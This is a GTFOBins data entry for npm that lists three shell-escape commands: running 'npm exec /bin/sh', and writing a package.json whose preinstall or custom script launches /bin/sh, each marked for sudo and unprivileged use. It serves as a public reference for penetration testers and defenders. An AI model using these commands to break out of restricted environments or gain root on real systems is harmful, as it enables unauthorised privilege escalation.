<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/npm -->
---
functions:
  shell:
  - code: |-
      npm exec /bin/sh
    contexts:
      sudo:
      unprivileged:
  - code: |-
      echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
      npm -C . i
    contexts:
      sudo:
      unprivileged:
  - code: |-
      echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
      npm -C . run xxx
    contexts:
      sudo:
      unprivileged:
...
